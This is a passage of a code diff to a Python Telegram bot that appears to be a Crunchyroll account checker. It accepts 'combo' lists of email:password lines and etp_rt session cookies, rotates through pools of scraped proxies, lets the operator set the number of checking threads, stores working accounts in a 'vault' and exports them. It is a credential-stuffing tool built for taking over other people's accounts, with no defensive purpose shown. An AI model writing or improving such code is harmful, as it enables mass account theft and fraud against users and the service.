-                f"📥 <b>Proxies Added</b>\n\n➕ <code>{added}</code> | ⚠️ <code>{invalid}</code> | Pool: <code>{pool_size()}</code> | 🌐 Live: <code>{proxy_count()}</code>\n\n{status}\n<i>Fake proxies will be filtered during check</i>",
-                [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "proxysettings", "danger")]],
+                f"📥 <b>Proxies Added</b>\n➕ <code>{added}</code> | ⚠️ <code>{invalid}</code> | Pool: <code>{pool_size()}</code> | 🌐 Live: <code>{proxy_count()}</code>",
+                [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]],
             )
             return
 
@@ -2504,63 +2263,84 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                 return
             arg = text.strip().lstrip("@")
-            try:
-                if arg.isdigit():
-                    ok = STORE.add_admin(int(arg))
-                    await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
-                else:
-                    ok = STORE.add_admin(0, arg)
-                    await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: @{arg}", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
-            except Exception as e:
-                await reply_menu(msg, f"❌ Error: <code>{e}</code>", [[("⬅️ Back", "admins", "danger")]])
+            ok = STORE.add_admin(int(arg)) if arg.isdigit() else STORE.add_admin(0, arg)
+            await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
             return
+
         if kind == "remadmin":
             clear_pending(uid)
             if uid != OWNER_ID:
                 await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                 return
             arg = text.strip().lstrip("@")
-            try:
-                if arg.isdigit():
-                    ok = STORE.remove_admin(int(arg))
-                else:
-                    ok = STORE.remove_admin(None, arg)
-                await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
-            except Exception as e:
-                await reply_menu(msg, f"❌ Error: <code>{e}</code>", [[("⬅️ Back", "admins", "danger")]])
-            return
-        if kind in ("tv_email", "tv_code"):
-            clear_pending(uid)
-            await reply_menu(msg, "ℹ️ TV removed — just a checker now.", [[("⬅️ Menu", "menu", "danger")]])
+            ok = STORE.remove_admin(int(arg)) if arg.isdigit() else STORE.remove_admin(None, arg)
+            await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
             return
 
         clear_pending(uid)
 
-    # Auto-detect proxy text paste (ip:port) vs combo
-    # If text looks like proxies and not combos, treat as proxy upload
-    proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
-    if proxy_lines:
+    # Admin direct paste auto-detection
+    if is_admin(uid, uname):
+        proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
         maybe_creds = extract_credentials(text)
         if proxy_lines and not maybe_creds:
-            ac = bool(STORE.get_setting("auto_check", True))
+            ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
             added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
-            await reply_menu(msg, f"📥 <b>Proxies Auto-Detected</b>\n\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code>\n📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
+            await reply_menu(msg, f"📥 <b>Proxies Auto-Detected</b>\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code> • Pool: <code>{pool_size()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
             return
-    # plain credential paste without button
-    creds = extract_credentials(text)
-    if creds:
-        if len(creds) > MAX_PASTED_CREDS:
-            await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file.", [[("📂 Check File", "file", "primary")]])
+        if maybe_creds:
+            if len(maybe_creds) > MAX_PASTED_CREDS:
+                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file.", [[("📂 Check File", "file", "primary")]])
+                return
+            await _run_and_report(msg, uid, text, save_hits_to_vault=True)
             return
-        await _run_and_report(msg, uid, text)
+
+
+async def _process_document(msg, context, uid: int, doc):
+    name = (doc.file_name or "unknown.txt").lower()
+    if not name.endswith((".txt", ".log", ".json", ".csv", ".dat", ".lst", ".zip")):
+        await reply_menu(
+            msg,
+            "❌ Only <code>.zip / .txt / .json / .csv / .log</code> files allowed.",
+            [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]],
+        )
         return
-    # if not creds and not pending, show menu only if user seems lost — but avoid double message on every random text
-    if text.startswith("/"):
-        mtext, rows = menu_main(uid)
-        await reply_menu(msg, "🔘 Use buttons 👇\n\n" + mtext, rows)
+    if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
+        await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).", [[("⬅️ Menu", "menu", "danger")]])
         return
-    # otherwise ignore free text to avoid spamming double messages
-    return
+
+    note = await msg.reply_text("📥 Downloading & extracting file...")
+    try:
+        tg_file = await context.bot.get_file(doc.file_id)
+        buf = io.BytesIO()
+        await tg_file.download_to_memory(buf)
+        text = await asyncio.to_thread(_extract_text_from_bytes, doc.file_name or "upload.txt", buf.getvalue())
+    except Exception as e:
+        await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
+        return
+
+    if not text.strip():
+        await note.edit_text("❌ File is empty or contains no readable text.")
+        return
+
+    proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
+    combo_creds = extract_credentials(text)
+    if proxy_lines and not combo_creds:
+        ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
+        added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
+        await note.edit_text(
+            f"📥 <b>Proxies Added</b>\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code> • Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    if not combo_creds:
+        await note.edit_text("❌ Koi valid Crunchyroll combo/cookie nahi mili.")
+        return
+
+    await note.delete()
+    await _run_and_report(msg, uid, text, save_hits_to_vault=True)
+
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -2569,107 +2349,30 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     uid = user.id
     if not is_admin(uid, getattr(user, "username", None)):
-        owner_contact2 = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
-        owner_url2 = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
-        await reply_menu(msg, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact2}", [[("💬 Contact Owner", owner_url2, "primary")]])
+        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
         return
+
     pending = get_pending(uid)
-
-    # Auto-detect file type if no pending or stale pending — proxy vs combo
-    # Will decide after downloading file whether it's proxy or combo
-
-    # Handle proxy file upload when in addpx state
     if pending and pending.get("kind") == "addpx":
         clear_pending(uid)
         doc = msg.document
-        name = (doc.file_name or "unknown.txt").lower()
-        if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
-            await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).",
-                             [[("📥 Try Again", "addpx", "primary"), ("⬅️ Menu", "menu", "danger")]])
-            return
-        note = await msg.reply_text("📥 Downloading proxy file...")
-        try:
-            tg_file = await context.bot.get_file(doc.file_id)
-            tmp_path = Path(tempfile.gettempdir()) / f"proxy_{uid}_{int(time.time())}.txt"
-            await tg_file.download_to_drive(str(tmp_path))
-            text = tmp_path.read_text(encoding="utf-8", errors="ignore")
-            tmp_path.unlink(missing_ok=True)
-        except Exception as e:
-            await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
-            return
-        lines = [l.strip() for l in text.splitlines() if l.strip()]
-        if not lines:
-            await note.edit_text("❌ No proxies found in file.", parse_mode=ParseMode.HTML)
-            return
-        if len(lines) > MAX_PASTED_PROXIES:
-            await note.edit_text(f"❌ Too many lines (max {MAX_PASTED_PROXIES}).", parse_mode=ParseMode.HTML)
-            return
-        ac = bool(STORE.get_setting("auto_check", True))
-        await note.edit_text(f"🔍 Testing <code>{len(lines)}</code> proxies... (auto-check {'ON' if ac else 'OFF'})", parse_mode=ParseMode.HTML)
-        added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
-        status = "🔍 Auto-check started..." if ac else "Added (live check skipped)."
-        await note.edit_text(
-            f"📥 <b>Proxies Uploaded</b>\n\n✅ Added: <code>{added}</code> • ⚠️ Invalid: <code>{invalid}</code>\n"
-            f"📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n\n{status}",
-            parse_mode=ParseMode.HTML
-        )
-        await reply_menu(msg, f"✅ Proxies ready! Pool: <code>{pool_size()}</code> • Live: <code>{proxy_count()}</code>",
-                         [[("🧪 Test Proxies", "proxysettings", "success"), ("💎 Check Account", "check", "success")], [("⬅️ Menu", "menu", "danger")]])
-        return
-
-    # Fix: file check should work even if pending is creds/addpx etc — clear and allow
-    if pending and pending["kind"] != "file":
-        # Don't block file upload — just clear stale pending (e.g., creds from previous Check Account)
-        clear_pending(uid)
-        pending = None
-    if pending:
-        clear_pending(uid)
-    if not _has_access(uid):
-        text, rows = menu_main(uid)
-        await reply_menu(msg, text, rows)
-        return
-
-    doc = msg.document
-    name = (doc.file_name or "unknown.txt").lower()
-    if not name.endswith((".txt", ".log", ".json", ".csv", ".dat", ".lst")):
-        await reply_menu(msg, "❌ Only <code>.txt / .log / .json / .csv / .dat</code> files allowed.",
-                         [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
-        return
-    if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
-        await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).",
-                         [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
-        return
-
-    note = await msg.reply_text("📥 Downloading file...")
-    try:
         tg_file = await context.bot.get_file(doc.file_id)
-        tmp_path = Path(tempfile.gettempdir()) / f"crunchy_{uid}_{int(time.time())}.txt"
-        await tg_file.download_to_drive(str(tmp_path))
-        text = tmp_path.read_text(encoding="utf-8", errors="ignore")
-        tmp_path.unlink(missing_ok=True)
-    except Exception as e:
-        await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>",
-                             parse_mode=ParseMode.HTML)
+        buf = io.BytesIO()
+        await tg_file.download_to_memory(buf)
+        text = buf.getvalue().decode("utf-8", errors="ignore")
+        lines = [l.strip() for l in text.splitlines() if l.strip()]
+        ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
+        added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
+        await reply_menu(
+            msg,
+            f"📥 <b>Proxies Uploaded</b>\n✅ Added: <code>{added}</code> • ⚠️ Invalid: <code>{invalid}</code> • Pool: <code>{pool_size()}</code>",
+            [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]],
+        )
         return
-    if not text.strip():
-        await note.edit_text("❌ File is empty.")
-        return
-    # Auto-detect: if file looks like proxies (ip:port lines) and no combos, treat as proxy upload
-    proxy_like = sum(1 for l in text.splitlines() if l.strip() and (":" in l.strip() and "@" in l.strip() or l.strip().count(":")>=1 and "." in l.strip() and not "@" in l.strip().split(":")[0]))
-    # Better: check if lines are ip:port and not email:pass
-    proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
-    combo_creds = extract_credentials(text)
-    if proxy_lines and not combo_creds:
-        # It's a proxy file — handle as proxy upload (1000% accuracy)
-        ac = bool(STORE.get_setting("auto_check", True))
-        added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
-        await note.edit_text(f"📥 <b>Proxies Auto-Detected & Added</b>\n\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code>\n📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n\n{'🔎 Auto-check...' if ac else ''}", parse_mode=ParseMode.HTML)
-        await reply_menu(msg, f"✅ Proxies ready! Pool: <code>{pool_size()}</code> • Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("💎 Check Account", "check", "success")], [("⬅️ Menu", "menu", "danger")]])
-        return
-    elif proxy_lines and combo_creds:
-        # Mixed file — prioritize combo check (user likely sent combo file with some proxy lines)
-        pass
-    await _run_and_report(msg, uid, text)
+
+    clear_pending(uid)
+    await _process_document(msg, context, uid, msg.document)
+
 
 async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global THREADS
@@ -2678,230 +2381,248 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     user = q.from_user
     uid = user.id if user else 0
+    uname = getattr(user, "username", None)
     data = q.data or ""
     m = q.message
     await q.answer()
 
     if data == "menu":
-        text, rows = menu_main(uid)
+        clear_pending(uid)
+        text, rows = menu_main(uid, uname)
         await edit_menu(m, text, rows)
         return
-    elif data == "help":
+
+    if data == "help":
         await edit_menu(m, help_text(), [[("⬅️ Back", "menu", "danger")]])
         return
-    elif data == "check":
-        if not is_admin(uid, getattr(user, "username", None)):
+
+    if data == "status":
+        await edit_menu(m, status_text(), [[("⬅️ Back", "menu", "danger")]])
+        return
+
+    if data == "tv_prompt":
+        set_pending(uid, "tv_code")
+        await edit_menu(
+            m,
+            "📺 <b>CRUNCHYROLL TV LOGIN</b>\n━━━━━━━━━━━━━━━━━━━━━\nSend your <b>6-character TV code</b> (e.g. <code>ABCD12</code>):",
+            [[("⬅️ Cancel", "menu", "danger")]],
+        )
+        return
+
+    if data == "vault_view":
+        if not is_admin(uid, uname):
+            await edit_menu(m, "🚫 <b>Admin only!</b>", [[("⬅️ Back", "menu", "danger")]])
+            return
+        await _send_vault_summary(m, edit=True)
+        return
+
+    if data == "vault_clear":
+        if not is_admin(uid, uname):
+            await edit_menu(m, "🚫 <b>Admin only!</b>", [[("⬅️ Back", "menu", "danger")]])
+            return
+        save_vault([])
+        await edit_menu(m, "🧹 <b>Vault Cleared!</b>\n🗄️ Accounts: <code>0</code>", [[("⬅️ Menu", "menu", "danger")]])
+        return
+
+    if data == "vault_export":
+        if not is_admin(uid, uname):
+            await edit_menu(m, "🚫 <b>Admin only!</b>", [[("⬅️ Back", "menu", "danger")]])
+            return
+        items = load_vault()
+        if not items:
+            await edit_menu(m, "🗄️ Vault is empty.", [[("⬅️ Menu", "menu", "danger")]])
+            return
+        txt_path = make_export([{**x, "st": "hit"} for x in items], "txt")
+        try:
+            with open(txt_path, "rb") as f:
+                await m.reply_document(document=InputFile(f, filename="crunchyroll_vault.txt"), caption=f"🗄️ Vault Export ({len(items)})")
+        finally:
+            Path(txt_path).unlink(missing_ok=True)
+        return
+
+    if data == "check":
+        if not is_admin(uid, uname):
             await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         set_pending(uid, "creds")
-        await edit_menu(m, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> — one or many lines.\nExample: <code>user@gmail.com:pass123</code>", [[("⬅️ Back", "menu", "danger")]])
+        await edit_menu(m, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> or <code>etp_rt</code> cookie — one or many lines.", [[("⬅️ Back", "menu", "danger")]])
         return
-    elif data == "file":
-        if not is_admin(uid, getattr(user, "username", None)):
+
+    if data == "file":
+        if not is_admin(uid, uname):
             await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
-        clear_pending(uid)
         set_pending(uid, "file")
-        await edit_menu(m, "📂 <b>Check File</b>\n\nSend me your file.", [[("⬅️ Back", "menu", "danger")]])
+        await edit_menu(m, "📂 <b>Check / Upload File</b>\n\nSend your <code>.zip</code>, <code>.txt</code>, <code>.json</code>, or <code>.csv</code> file.", [[("⬅️ Back", "menu", "danger")]])
         return
-    elif data == "status":
-        await edit_menu(m, status_text(), [[("⬅️ Back", "menu", "danger")]])
-        return
-    elif data == "proxysettings":
-        if not is_admin(uid, getattr(user, "username", None)):
-            owner_contact3 = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
-            owner_url3 = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
-            await edit_menu(m, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact3}", [[("💬 Contact Owner", owner_url3, "primary")]])
+
+    if data in ("proxysettings", "opanel"):
+        if not is_admin(uid, uname):
+            await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         text, rows = menu_owner()
         await edit_menu(m, text, rows)
         return
-    elif data == "opanel":
-        text, rows = menu_owner()
-        await edit_menu(m, text, rows)
-        return
-    elif data == "pool":
-        await edit_menu(m, "ℹ️ Use <b>⚙️ Proxy Settings</b>.", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
-        return
-    elif data == "addpx":
+
+    if data == "addpx":
+        if not is_admin(uid, uname):
+            return
         set_pending(uid, "addpx")
-        await edit_menu(m, "📥 <b>Upload Proxies</b>\n\nPaste lines (one per line):\n<code>host:port</code> or <code>user:pass@ip:port</code>", [[("⬅️ Back", "proxysettings", "danger")]])
+        await edit_menu(m, "📥 <b>Upload Proxies</b>\n\nPaste lines: <code>host:port</code> or <code>user:pass@ip:port</code>", [[("⬅️ Back", "proxysettings", "danger")]])
         return
-    elif data == "disableproxies":
+
+    if data == "disableproxies":
+        if not is_admin(uid, uname):
+            return
         with PROXY_LOCK:
             LIVE_PROXIES.clear()
-        await edit_menu(m, "🔵 <b>Proxies Disabled</b>\n🌐 Live: <code>0</code> • Pool kept.", [[("📤 Upload Proxies", "addpx", "success"), ("⬅️ Back", "proxysettings", "danger")]])
+        await edit_menu(m, "🔵 <b>Proxies Disabled</b>\n🌐 Live: <code>0</code>", [[("📤 Upload Proxies", "addpx", "success"), ("⬅️ Back", "proxysettings", "danger")]])
         return
-    elif data == "clearpool":
+
+    if data == "clearpool":
+        if not is_admin(uid, uname):
+            return
         await asyncio.to_thread(clear_pool)
         text, rows = menu_owner()
         await edit_menu(m, "🧹 <b>Pool cleared.</b>\n\n" + text, rows)
         return
-    elif data == "autoproxy":
+
+    if data == "autoproxy":
+        if not is_admin(uid, uname):
+            return
         cur = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
         STORE.set_setting("auto_proxy", not cur)
-        STORE.save()
         text, rows = menu_owner()
-        await edit_menu(m, f"{'✅ Auto Load ON' if not cur else '⏸️ Auto Load OFF'} — 24x7 auto-fetch {'enabled' if not cur else 'disabled'}\n\n" + text, rows)
+        await edit_menu(m, f"{'✅ Auto Load ON' if not cur else '⏸️ Auto Load OFF'}\n\n" + text, rows)
         return
-    elif data == "setthreads":
-        await edit_menu(m, f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code> • Max 300",
-                        [[("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")],
-                         [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")],
-                         [("🧵 500", "threads_500", "success")],
-                         [("⬅️ Back", "proxysettings", "danger")]])
+
+    if data == "setthreads":
+        if not is_admin(uid, uname):
+            return
+        await edit_menu(
+            m,
+            f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code>",
+            [
+                [("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")],
+                [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")],
+                [("⬅️ Back", "proxysettings", "danger")],
+            ],
+        )
         return
-    elif data.startswith("threads_"):
+
+    if data.startswith("threads_"):
+        if not is_admin(uid, uname):
+            return
         try:
             val = int(data.split("_")[1])
             if 10 <= val <= 500:
                 THREADS = val
-                try:
+                if STORE:
                     STORE.set_setting("threads", val)
-                except Exception:
-                    pass
-                await edit_menu(m, f"✅ <b>Threads Set</b>\n🧵 Now: <code>{THREADS}</code> • ~<code>{THREADS*4} cpm</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
+                await edit_menu(m, f"✅ <b>Threads Set:</b> <code>{THREADS}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
                 return
         except Exception:
             pass
-        await edit_menu(m, "❌ Invalid.", [[("⬅️ Back", "proxysettings", "danger")]])
         return
-    elif data == "refresh":
-        REFRESH_STATE["start"] = time.time()
-        await edit_menu(m, "🔄 <b>Refreshing proxies...</b>\n━━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Gathering</b> from 12 sources...\n📦 <b>Queued</b> 1000 candidates", None)
-        async def _rp():
-            while True:
-                await asyncio.sleep(1.2)
-                try:
-                    tested = REFRESH_STATE.get("tested", 0)
-                    total = REFRESH_STATE.get("total", 1000) or 1000
-                    live = REFRESH_STATE.get("live", 0)
-                    pct = int(tested / total * 100) if total else 0
-                    bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
-                    elapsed = int(time.time() - REFRESH_STATE.get("start", time.time()))
-                    # Real ETA based on rate
-                    rate = tested / max(1, elapsed)
-                    eta = int((total - tested) / max(1, rate)) if rate else 0
-                    await edit_menu(m, f"🔄 <b>Refreshing — Real Live</b>\n━━━━━━━━━━━━━━━━━━━━━\n📦 <b>Testing</b> {tested}/{total} [{bar}] {pct}%\n🌐 <b>Live:</b> <code>{live}</code> • ✅ <b>Rate:</b> <code>{live}/{tested}</code>\n⏱️ <b>Elapsed:</b> <code>{elapsed}s</code> • ⏳ <b>ETA:</b> <code>{eta}s</code>\n⚡ <b>100x Fast</b> • 150 workers", None)
-                except Exception:
-                    break
-        prog=asyncio.create_task(_rp())
-        try:
-            await asyncio.to_thread(refresh_live_proxies, True)
-        finally:
-            try: prog.cancel()
-            except: pass
-        elapsed = int(time.time() - REFRESH_STATE.get("start", time.time()))
-        live = proxy_count()
-        pool = pool_size()
-        await edit_menu(m, f"✅ <b>Auto Proxies Ready — Real</b>\n━━━━━━━━━━━━━━━━━━━━━\n🌐 <b>Live:</b> <code>{live}</code> • 📦 <b>Pool:</b> <code>{pool}</code>\n⏱️ <b>Time:</b> <code>{elapsed}s</code> • Tested {REFRESH_STATE.get('tested',0)}/{REFRESH_STATE.get('total',0)}\n⚡ <b>100x Fast</b> • 1:1 ready", [[("⚙️ Proxy Settings","proxysettings","primary"),("⬅️ Back","menu","danger")]])
+
+    if data == "refresh":
+        if not is_admin(uid, uname):
+            return
+        await edit_menu(m, "🔄 <b>Refreshing proxies...</b>", None)
+        await asyncio.to_thread(refresh_live_proxies, True)
+        await edit_menu(
+            m,
+            f"✅ <b>Proxies Ready</b>\n🌐 Live: <code>{proxy_count()}</code> • 📦 Pool: <code>{pool_size()}</code>",
+            [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]],
+        )
         return
-    elif data == "admins":
+
+    if data == "admins":
         if uid != OWNER_ID and uid not in ADMIN_IDS:
             await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         admins = STORE.get_admins() if STORE else []
         admins_u = STORE.get_setting("admin_usernames", []) if STORE else []
-        txt2 = "👥 <b>Admins — Owner Panel</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
-        txt2 += f"👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
-        txt2 += "━━━━━━━━━━━━━━━━━━━━━\n"
-        if admins or admins_u:
-            for a in admins:
-                txt2 += f"• <code>{a}</code>\n"
-            for u in admins_u:
-                txt2 += f"• @{u}\n"
-        else:
-            txt2 += "<i>No admins yet</i>\n"
-        txt2 += "━━━━━━━━━━━━━━━━━━━━━\n"
-        txt2 += "<i>Tap Add/Remove to manage</i>"
+        txt2 = f"👥 <b>Admins</b>\n━━━━━━━━━━━━━━━━━━━━━\n👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
+        for a in admins:
+            txt2 += f"• <code>{a}</code>\n"
+        for u in admins_u:
+            txt2 += f"• @{u}\n"
         await edit_menu(m, txt2, [[("➕ Add Admin", "addadmin", "success"), ("➖ Remove Admin", "remadmin", "danger")], [("⬅️ Back", "menu", "danger")]])
         return
-    elif data == "addadmin":
+
+    if data == "addadmin":
         if uid != OWNER_ID:
-            await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         set_pending(uid, "addadmin")
-        await edit_menu(m, "➕ <b>Add Admin</b>\n\nSend <code>USER_ID</code> or <code>@username</code>\nOr forward a message from the user.", [[("⬅️ Back", "admins", "danger")]])
+        await edit_menu(m, "➕ <b>Add Admin</b>\nSend <code>USER_ID</code> or <code>@username</code>", [[("⬅️ Back", "admins", "danger")]])
         return
-    elif data == "remadmin":
+
+    if data == "remadmin":
         if uid != OWNER_ID:
-            await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         set_pending(uid, "remadmin")
-        await edit_menu(m, "➖ <b>Remove Admin</b>\n\nSend <code>USER_ID</code> or <code>@username</code>", [[("⬅️ Back", "admins", "danger")]])
-        return
-    elif data in ("genpick", "gen_24", "gen_48", "gen_72", "autocheck", "oxaam", "tv"):
-        await edit_menu(m, "ℹ️ <b>Just a Checker</b> — that feature was removed.\nUse <b>💎 Check Account</b> / <b>📂 Check File</b>.", [[("⬅️ Back", "menu", "danger")]])
+        await edit_menu(m, "➖ <b>Remove Admin</b>\nSend <code>USER_ID</code> or <code>@username</code>", [[("⬅️ Back", "admins", "danger")]])
         return
 
 
 async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error("Unhandled error: %s", context.error, exc_info=context.error)
+
+
+# ===================== ENTRYPOINT =====================
+async def _post_init(app: Application):
     try:
-        if update and update.effective_message:
-            await update.effective_message.reply_text(
-                "❌ Internal error — try again or contact the owner."
-            )
+        await app.bot.set_my_commands([
+            BotCommand("start", "Main menu"),
+            BotCommand("tv", "Activate Crunchyroll TV code"),
+            BotCommand("upload", "Upload combo/cookie file to vault (Admin)"),
+            BotCommand("vault", "View saved vault accounts (Admin)"),
+            BotCommand("proxy", "Proxy settings (Admin)"),
+            BotCommand("help", "Help & instructions"),
+        ])
     except Exception:
         pass
 
-# ===================== ENTRYPOINT =====================
+
 def main():
     if not BOT_TOKEN or ":" not in BOT_TOKEN:
-        print("[!] BOT_TOKEN is not set.  Export BOT_TOKEN=<token from @BotFather>")
+        print("[!] BOT_TOKEN is not set.")
         sys.exit(1)
     if not OWNER_ID:
-        print("[!] OWNER_ID is not set (or not a number).  Export OWNER_ID=<your Telegram numeric id>")
+        print("[!] OWNER_ID is not set.")
         sys.exit(1)
 
     global STORE, THREADS
     STORE = Store(DATA_DIR / "store.json")
-    # Load THREADS from store if set via bot
     try:
         saved_threads = STORE.get_setting("threads", None)
         if saved_threads and 10 <= int(saved_threads) <= 500:
             THREADS = int(saved_threads)
-            print(f"[*] Loaded THREADS from store: {THREADS}")
     except Exception:
         pass
 
-    print(f"[*] CrunchyrollChecker — BlazeNXT single checker starting")
-    print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID}) | Threads: {THREADS} | Data dir: {DATA_DIR.resolve()}")
-
     _load_pool_into_live()
-    # Immediate auto-load if enabled
     try:
         if bool(STORE.get_setting("auto_proxy", True)):
-            refresh_live_proxies(force=True)
-            print(f"[*] Auto proxies initial: {proxy_count()} live")
-        else:
-            print(f"[*] Auto Load OFF — skipping initial refresh")
-    except Exception as e:
